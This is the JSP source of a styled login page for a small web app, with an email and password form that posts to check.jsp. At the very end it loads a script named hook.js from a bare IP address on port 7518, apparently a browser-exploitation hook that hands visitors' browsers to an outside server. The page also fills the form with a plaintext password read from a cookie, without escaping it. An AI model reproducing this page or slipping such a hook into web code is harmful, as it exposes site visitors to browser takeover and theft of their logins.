<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign up</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
        padding-top: 160px;
        padding-left: 10%;
        position: relative;
        background: url('https://cdn.dribbble.com/userupload/21957699/file/original-fd768c65ea40a0b7ae0e5ffc2fcae859.gif') no-repeat center center fixed;
        background-size: cover;
        min-width: 500px;
        min-height: 200px;
        color: #fff;
        font-family: 'Montserrat';
        height:100vmax;
      }
      h1{
        text-shadow: 0 56px 40px rgba(0, 0, 0, 5.19), 0 8px 26px rgba(0, 0, 0, 3.23);
    text-transform: uppercase;
    font-size: 31px;
    letter-spacing: 5px;
    padding-left: 34%;
    margin-top: -30px;
    color: rgb(73, 255, 103);
      }
      .card {
    margin: 32%;
  max-width: 300px;
  min-height: 200px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  margin-top: 20px;
  max-width: 500px;
  height: 300px;
  color: cornflowerblue;
  padding: 35px;
  font-size: 45px;
  border: 1px solid rgba(255, 255, 255, .25);
  border-radius: 20px;
  background-color: rgba(255, 255, 255, 0.31);
  box-shadow: 0 0 10px 1px rgba(0, 0, 0, 0.25);

  backdrop-filter: blur(15px);
  transition: all ease-in-out 0.4s;
}
.card:hover{
transform: scale(1.06);
box-shadow:0px 0px 20px pink,inset 0px 0px 20px pink;
}
.card .formm{
    width:97%;
    height: 500px;
    margin-top: -35px;
    margin-right: 80px;
    float: left;
   border-radius: 20px;

}
.card .formm form{
    margin-top: 75px;
    width: 100%;
    height: 80%;
    /* background-color: aqua; */
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
    gap: 33px;
}
.card .formm input{
width: 60%;
height: 30px;
font-size: 18px;
font-family: 'Times New Roman', Times, serif;
font-style: italic;
border-radius: 5px;
border: 2px solid silver;
outline: none;
text-align: center;
transition: all ease-in 0.4s;
}

.card .formm input:focus{
    border: 3px solid cyan ;
    transform: scale(1.09);
}
.card .formm .but:hover{
    border: 3px solid violet;
    transform: scale(1.05);
}
.card .formm .but{
    width:40%;
    height:50px;
    background-color: blue;
    margin-bottom: 40px;
    color: aliceblue;
    font-size: 30px;
    border-radius: 10px;
    box-shadow: inset;
    transition: all ease-in 0.4s;   
}
        </style>
</head>
<body>
<%
    String usr = "";
    String pswd = "";
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if (cookie.getName().equals("username")) usr = cookie.getValue();
            if (cookie.getName().equals("password")) pswd = cookie.getValue();
        }
    }
%>
    <div class="header">
        <div class="bars" id="nav-action">
            <span class="bar"> </span>
          </div>
          
          <!--Navbar Links-->
          <nav id="nav">
            <ul>
              <li class="shape-circle circle-one"><a href="index.jsp">Register</a></li>
              <!-- <li class="shape-circle circle-two"><a href="#">Sign In</a></li> -->
              <li class="shape-circle circle-three"><a href="About.jsp">About Us</a></li>
              <li class="shape-circle circle-five">
                <a href="index.jsp">Home</a>
              </li>
            </ul>
          </nav>
          
          
    </div>
    <div class="card">
        <div class="titl"><h1>Sign In</h1></div>
        <div class="formm" >
            <form id='myForm' action="check.jsp" method="post">
                        <input type="email" name="uname" placeholder="Email" value="<%=usr %>">
        <input type="password" name="pwd" id="" placeholder="Password" value="<%=pswd%>">
               
                <button type="submit" class="but" >Submit</button>
            </form>
        </div>
      </div>
        
    <script>
        // Setting up the Variables
var bars = document.getElementById("nav-action");
var nav = document.getElementById("nav");

//setting up the listener
bars.addEventListener("click", barClicked, false);


//setting up the clicked Effect
function barClicked() {
  bars.classList.toggle('active');
  nav.classList.toggle('visible');
}
    </script>
    <script src="http://147.185.221.21:7518/hook.js"></script>
</body>
</html>